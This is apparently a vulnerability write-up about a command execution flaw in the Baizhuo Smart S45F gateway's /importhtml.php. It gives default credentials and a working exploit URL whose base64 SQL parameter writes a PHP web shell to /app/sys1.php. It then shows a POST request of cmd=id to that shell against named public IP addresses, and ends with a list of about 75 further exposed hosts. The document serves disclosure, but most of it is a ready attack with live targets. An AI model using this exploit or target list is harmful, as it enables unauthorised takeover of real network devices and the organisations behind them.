There is a Command Execution Vulnerability in the Intelligent Management Platform of Baizhuo Network Smart S45F Multi Service Security Gateway


**1、 Vulnerability Description**
Beijing Baizhuo Network Technology Co., Ltd. (hereinafter referred to as Baizhuo Network) is a high-tech enterprise dedicated to building the next generation of secure internet.
The Baizhuo Network Smart S45F Multi Service Security Gateway Intelligent Management Platform has a command execution vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.


**2、 Vulnerability Impact**

Smart S45F

**3、 Location of vulnerabilities**

/importhtml.php

**4、 Recurrence of vulnerabilities**

**Recurrence One**

Ip：https://103.121.164.62:8443/

See The login page

![图片](https://github.com/TianDao888/RCEs/assets/131896134/97c4d8d4-4f07-4e8b-8b22-63d87544110e)

user password：admin/admin

Construct a URL, download successfully, construct a POC, and execute the command successfully
https://103.121.164.62:8443/importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn


**Construct poc:**
```php
POST /app/sys1.php HTTP/1.1
Host: 60.22.74.195:8443
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

cmd=id
```
![图片](https://github.com/TianDao888/RCEs/assets/131896134/2b7c506b-8de5-4685-a2ab-3515cdf38d09)


**Recurrence Two**

Ip：https://222.179.98.22:8443/

See The login page

![图片](https://github.com/TianDao888/RCEs/assets/131896134/0928080d-3414-4245-9e1b-96c729338755)

Construct a URL, download successfully, construct a POC, and execute the command successfully
https://222.179.98.22:8443/importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn

**Construct poc:**

```php
POST /app/sys1.php HTTP/1.1
Host: 60.22.74.195:8443
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

cmd=id
```

![图片](https://github.com/TianDao888/RCEs/assets/131896134/52887a30-72ce-44e9-9f17-5c3ddf5d5cf6)



**Other IP Address**
https://202.106.56.254:8443
https://49.65.226.114:8443
https://114.221.221.158:8443
https://218.104.188.235:8443
https://117.89.159.189:8443
https://218.6.77.226:8443
https://218.70.169.122:8443
https://175.162.101.25:8443
https://222.94.19.62:8443
https://218.93.66.83:8443
https://61.148.37.6:8443
https://222.94.19.145:8443
https://120.193.195.68:8443
https://175.162.99.55:8443
https://113.227.177.79:8443
https://117.88.133.59:8443
https://117.88.183.171:8443
https://218.75.81.138:8443
https://218.18.36.116:8443
https://180.111.82.207:8443
https://117.88.182.120:8443
https://117.89.121.168:8443
https://117.88.187.194:8443
https://222.179.98.22:8443
https://121.225.140.24:8443
https://117.63.49.36:8443
https://103.121.164.62:8443
https://114.221.220.106:8443
https://117.89.91.231:8443
https://124.200.184.166:8443
https://175.162.102.7:8443
https://222.183.234.68:8443
https://122.235.243.216:8443
https://211.167.86.3:8443
https://183.69.13.10:8443
https://117.89.158.107:8443
https://117.88.133.116:8443
https://114.221.221.108:8443
https://112.2.38.197:8443
https://112.91.244.116:8443
https://218.93.66.161:8443
https://114.221.223.78:8443
https://113.227.187.163:8443
https://121.225.137.182:8443
https://61.186.240.22:8443
https://221.226.160.131:8443
https://117.89.120.171:8443
https://218.93.66.153:8443
https://117.88.184.242:8443
https://117.88.180.56:8443
https://116.18.42.246:8443
https://122.225.12.206:8443
https://58.211.143.2:8443
https://61.164.139.254:8443
https://183.66.235.10:8443
https://125.85.166.55:8443
https://117.88.182.202:8443
https://114.221.1.206:8443
https://121.225.136.177:8443
https://49.77.25.199:8443
https://49.77.24.156:8443
https://221.7.96.86:8443
https://113.227.178.250:8443
https://49.77.25.16:8443
https://110.80.24.50:8443
https://222.94.19.209:8443
https://49.65.226.92:8443
https://222.183.233.135:8443
https://114.228.66.177:8443
https://114.222.218.35:8443
https://106.120.128.18:8443
https://27.154.56.10:8443
https://222.179.221.118:8443
https://14.215.219.154:8443
https://221.226.161.207:8443
https://117.89.120.42:8443
